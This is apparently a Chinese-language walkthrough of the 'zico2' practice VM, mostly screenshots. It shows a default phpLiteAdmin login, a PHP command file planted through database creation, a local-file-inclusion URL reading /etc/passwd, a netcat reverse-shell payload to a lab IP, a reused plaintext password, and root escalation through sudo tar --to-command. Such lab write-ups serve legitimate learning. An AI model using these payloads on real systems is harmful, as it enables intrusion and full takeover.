# zico2

![image-20200622021837781](assets/zico2.assets/image-20200622021837781.png)

![image-20200622022112975](assets/zico2.assets/image-20200622022112975.png)

![image-20200622022737755](assets/zico2.assets/image-20200622022737755.png)

dbadmin

![image-20200622022839287](assets/zico2.assets/image-20200622022839287.png)

查看test_db.php发现是phpadmin

![image-20200622022928088](assets/zico2.assets/image-20200622022928088.png)

尝试admin，直接进入了

![image-20200622023011176](assets/zico2.assets/image-20200622023011176.png)

![image-20200622023113651](assets/zico2.assets/image-20200622023113651.png)

根据漏洞信息，我们可以简单的通过新建db的方式在服务器生成我们想要的php文件。

![image-20200622023153208](assets/zico2.assets/image-20200622023153208.png)

![image-20200622023608737](assets/zico2.assets/image-20200622023608737.png)

![image-20200622023640700](assets/zico2.assets/image-20200622023640700.png)

```bash
<?php system("id"); ?>
```

![image-20200622023522255](assets/zico2.assets/image-20200622023522255.png)

![image-20200622204546761](assets/zico2.assets/image-20200622204546761.png)

成功可以在状态中发现准确的物理路径

![image-20200622204755930](assets/zico2.assets/image-20200622204755930.png)



查看页面，发现一处似乎存在文件包含的地方

![image-20200622022336943](assets/zico2.assets/image-20200622022336943.png)

![image-20200622022429941](assets/zico2.assets/image-20200622022429941.png)

测试

```bash
http://10.10.10.143/view.php?page=../../../../etc/passwd
```

![image-20200622022505684](assets/zico2.assets/image-20200622022505684.png)

典型本地文件包含，我们尝试包含之前利用漏洞新建的php,,(由于切换了桥接模式，这里ip发生变化)

```bash
http://192.168.43.44/view.php?page=../../../../../usr/databases/evil.php
```

![image-20200622205008985](assets/zico2.assets/image-20200622205008985.png)

可以看到成功执行evil.php中的命令

再次修改evil.php的内容。使之可以为我们弹回一个shell

![image-20200622205200313](assets/zico2.assets/image-20200622205200313.png)

修改为

```bash
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.43.66 1337 >/tmp/f"); ?>
```

![image-20200622205318316](assets/zico2.assets/image-20200622205318316.png)

建立监听并再次包含

得到shell

![image-20200622202856129](assets/zico2.assets/image-20200622202856129.png)

![image-20200622203520190](assets/zico2.assets/image-20200622203520190.png)

尝试密码复用

```bash
zico
sWfCsfJSPV9H3AmQzw8
```

![image-20200622203616638](assets/zico2.assets/image-20200622203616638.png)



![image-20200622203643460](assets/zico2.assets/image-20200622203643460.png)

利用tar，先写个shell

```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.43.66 1338 >/tmp/f' > shell.sh
```

![image-20200622204157856](assets/zico2.assets/image-20200622204157856.png)

然后将shell压缩

```bash
tar -cvf shell.tar shell.sh
```

![image-20200622204316106](assets/zico2.assets/image-20200622204316106.png)

最后，在kali设置监听，并在目标执行sudo，成功会在kali弹回shell

```bash
sudo /bin/tar -xvf shell.tar --to-command /bin/bash shell.sh
```

![image-20200622204423403](assets/zico2.assets/image-20200622204423403.png)

![image-20200622204437261](assets/zico2.assets/image-20200622204437261.png)

